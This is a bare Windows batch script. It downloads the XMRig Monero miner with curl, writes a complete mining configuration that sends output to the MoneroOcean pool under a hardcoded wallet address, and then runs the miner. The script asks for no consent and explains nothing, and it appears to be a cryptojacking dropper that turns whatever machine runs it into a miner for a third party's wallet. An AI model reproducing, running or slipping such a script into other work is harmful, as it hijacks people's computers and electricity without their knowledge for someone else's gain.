@echo off
@echo off
if exist "C:\path\to\folder\file.txt" (
    echo File exists.
) else (

    curl -O -L https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip

    expand xmrig-6.21.3-msvc-win64.zip -F:* 

    (
    echo. {
    echo.     "api": {
    echo.         "id": null,
    echo.         "worker-id": null
    echo.     },
    echo.     "http": {
    echo.         "enabled": false,
    echo.         "host": "127.0.0.1",
    echo.         "port": 0,
    echo.         "access-token": null,
    echo.         "restricted": true
    echo.     },
    echo.     "autosave": true,
    echo.     "background": false,
    echo.     "colors": true,
    echo.     "title": true,
    echo.     "randomx": {
    echo.         "init": -1,
    echo.         "init-avx2": -1,
    echo.         "mode": "auto",
    echo.         "1gb-pages": false,
    echo.         "rdmsr": true,
    echo.         "wrmsr": true,
    echo.         "cache_qos": false,
    echo.         "numa": true,
    echo.         "scratchpad_prefetch_mode": 1
    echo.     },
    echo.     "cpu": {
    echo.         "enabled": true,
    echo.         "huge-pages": true,
    echo.         "huge-pages-jit": false,
    echo.         "hw-aes": null,
    echo.         "priority": null,
    echo.         "memory-pool": false,
    echo.         "yield": true,
    echo.         "max-threads-hint": 100,
    echo.         "asm": true,
    echo.         "argon2-impl": null,
    echo.         "cn/0": false,
    echo.         "cn-lite/0": false
    echo.     },
    echo.     "opencl": {
    echo.         "enabled": false,
    echo.         "cache": true,
    echo.         "loader": null,
    echo.         "platform": "AMD",
    echo.         "adl": true,
    echo.         "cn/0": false,
    echo.         "cn-lite/0": false
    echo.     },
    echo.     "cuda": {
    echo.         "enabled": false,
    echo.         "loader": null,
    echo.         "nvml": true,
    echo.         "cn/0": false,
    echo.         "cn-lite/0": false
    echo.     },
    echo.     "donate-level": 1,
    echo.     "donate-over-proxy": 1,
    echo.     "log-file": null,
    echo.     "pools": [
    echo.         {
    echo.             "algo": null,
    echo.             "coin": null,
    echo.             "url": "gulf.moneroocean.stream:10128",
    echo.             "user": "43pN6jeC8kfgDGa7tSFhYpKi8JhDgAxXBcEcHVDPFRN3EWhdnWjRxar5cXoz8sfQ8VQxYsTUJgtcE5XztKp7D2s579F2kq1",
    echo.             "pass": "x",
    echo.             "rig-id": null,
    echo.             "nicehash": false,
    echo.             "keepalive": false,
    echo.             "enabled": true,
    echo.             "tls": false,
    echo.             "tls-fingerprint": null,
    echo.             "daemon": false,
    echo.             "socks5": null,
    echo.             "self-select": null,
    echo.             "submit-to-origin": false
    echo.         }
    echo.     ],
    echo.     "print-time": 60,
    echo.     "health-print-time": 60,
    echo.     "dmi": true,
    echo.     "retries": 5,
    echo.     "retry-pause": 5,
    echo.     "syslog": false,
    echo.     "tls": {
    echo.         "enabled": false,
    echo.         "protocols": null,
    echo.         "cert": null,
    echo.         "cert_key": null,
    echo.         "ciphers": null,
    echo.         "ciphersuites": null,
    echo.         "dhparam": null
    echo.     },
    echo.     "dns": {
    echo.         "ipv6": false,
    echo.         "ttl": 30
    echo.     },
    echo.     "user-agent": null,
    echo.     "verbose": 0,
    echo.     "watch": true,
    echo.     "pause-on-battery": false,
    echo.     "pause-on-active": false
    echo. }
    ) > xmrig-6.21.3-msvc-win64\\xmrig-6.21.3\\config.json
)

xmrig-6.21.3-msvc-win64\\xmrig-6.21.3\\xmrig.exe
